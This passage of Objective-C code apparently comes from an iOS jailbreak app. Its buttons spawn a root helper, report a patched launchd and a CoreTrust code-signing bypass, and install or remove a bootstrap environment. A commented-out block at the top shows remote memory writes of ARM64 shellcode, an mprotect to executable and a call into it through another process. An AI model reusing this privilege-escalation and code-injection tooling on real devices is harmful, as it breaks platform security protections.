//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(self.dtProc, mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(self.dtProc, ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(self.dtProc, ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(self.dtProc, mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(self.dtProc, ((uint64_t (*)(void))map));
    });
}

- (void)rootHelperButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        printf("=== Starting RootHelper ===\n");
        
        NSString *execPath = NSBundle.mainBundle.executablePath;
        NSString *stdOut = nil;
        NSString *stdErr = nil;
        
        int exit_code = spawnRoot(execPath, @[@"roothelper"], &stdOut, &stdErr);
        
        // Print all roothelper output
        if (stdOut && stdOut.length > 0) {
            printf("%s", stdOut.UTF8String);
        }
        if (stdErr && stdErr.length > 0) {
            fprintf(stderr, "%s", stdErr.UTF8String);
        }
        
        if (exit_code == 0) {
            printf("\n✓ RootHelper completed successfully!\n");
            printf("Symlink: /var/.launchd -> /private/preboot/<hash>/hax/launchd\n");
            printf("Status: Patched + ldid + CoreTrust Bypassed\n");
        } else {
            printf("\n✗ RootHelper failed with exit code: %d\n", exit_code);
        }
        
        printf("=== RootHelper finished ===\n");
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        printf("Currently do nothing\n");
    });
}

- (void)bootstrapButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        printf("\n=== Starting Bootstrap Installation ===\n");
        
        // Check if already installed
        if (isBootstrapInstalled()) {
            printf("Bootstrap is already installed at %s\n", find_jbroot(NO).UTF8String);
            dispatch_async(dispatch_get_main_queue(), ^{
                [self alertWithTitle:@"Bootstrap" message:@"Bootstrap is already installed!"];
            });
            return;
        }
        
        // First run roothelper to setup environment
        printf("Setting up roothide environment...\n");
        NSString *execPath = NSBundle.mainBundle.executablePath;
        NSString *stdOut = nil;
        NSString *stdErr = nil;
        int exit_code = spawnRoot(execPath, @[@"roothelper"], &stdOut, &stdErr);
        
        if (stdOut && stdOut.length > 0) {
            printf("%s", stdOut.UTF8String);
        }
        if (stdErr && stdErr.length > 0) {
            fprintf(stderr, "%s", stdErr.UTF8String);
        }
        
        if (exit_code != 0) {
            printf("✗ Failed to setup environment\n");
            dispatch_async(dispatch_get_main_queue(), ^{
                [self alertWithTitle:@"Error" message:@"Failed to setup roothide environment"];
            });
            return;
        }
        
        // Look for bootstrap tar in app bundle
        NSString *bundlePath = NSBundle.mainBundle.bundlePath;
        NSArray *possibleBootstraps = @[
            @"bootstrap.tar.zst",
            @"bootstrap.tar.gz", 
            @"bootstrap.tar"
        ];
        
        NSString *bootstrapPath = nil;
        for (NSString *name in possibleBootstraps) {
            NSString *path = [bundlePath stringByAppendingPathComponent:name];
            if ([[NSFileManager defaultManager] fileExistsAtPath:path]) {
                bootstrapPath = path;
                break;
            }
        }
        
        if (bootstrapPath) {
            printf("Found bootstrap at: %s\n", bootstrapPath.UTF8String);
            
            int result = extractBootstrap(bootstrapPath);
            if (result != 0) {
                printf("✗ Failed to extract bootstrap\n");
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self alertWithTitle:@"Error" message:@"Failed to extract bootstrap"];
                });
                return;
            }
            
            // Initialize bootstrap
            result = initializeBootstrap();
            if (result != 0) {
                printf("✗ Failed to initialize bootstrap\n");
            }
        } else {
            printf("No bootstrap archive found in app bundle\n");
            printf("Creating empty roothide environment...\n");
            initializeBootstrap();
        }
        
        printf("=== Bootstrap Installation Complete ===\n\n");
        
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *jbrootPath = find_jbroot(NO);
            NSString *msg = jbrootPath ? 
                [NSString stringWithFormat:@"Bootstrap installed at:\n%@", jbrootPath] :
                @"Roothide environment created";
            [self alertWithTitle:@"Success" message:msg];
        });
    });
}

- (void)removeBootstrapTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Remove Bootstrap" 
                                                                   message:@"This will remove the entire jbroot directory. Are you sure?"
                                                            preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction *removeAction = [UIAlertAction actionWithTitle:@"Remove" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            printf("Removing bootstrap...\n");
            int result = removeBootstrap();
            dispatch_async(dispatch_get_main_queue(), ^{
                if (result == 0) {
                    [self alertWithTitle:@"Success" message:@"Bootstrap removed successfully"];
                } else {
                    [self alertWithTitle:@"Error" message:@"Failed to remove bootstrap"];
                }
            });
        });
    }];
    
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:removeAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)showJBRootInfo {
    NSString *jbrootPath = find_jbroot(YES);
    NSString *message;
    
    if (jbrootPath) {
        uint64_t rand = jbrand();
        BOOL installed = isBootstrapInstalled();
        message = [NSString stringWithFormat:
                   @"JBRoot Path:\n%@\n\n"
                   @"JBRand: 0x%016llX\n\n"
                   @"Bootstrap Installed: %@",
                   jbrootPath, rand, installed ? @"Yes" : @"No"];
    } else {
        message = @"No jbroot found.\n\nRun RootHelper first to create the roothide environment.";
    }
    
    printf("\n=== JBRoot Info ===\n");
    printf("%s\n", message.UTF8String);
    printf("===================\n\n");
    
    [self alertWithTitle:@"Roothide Info" message:message];
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
        UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
        [alert addAction:okAction];
        [self presentViewController:alert animated:YES completion:nil];
    });
}

@end
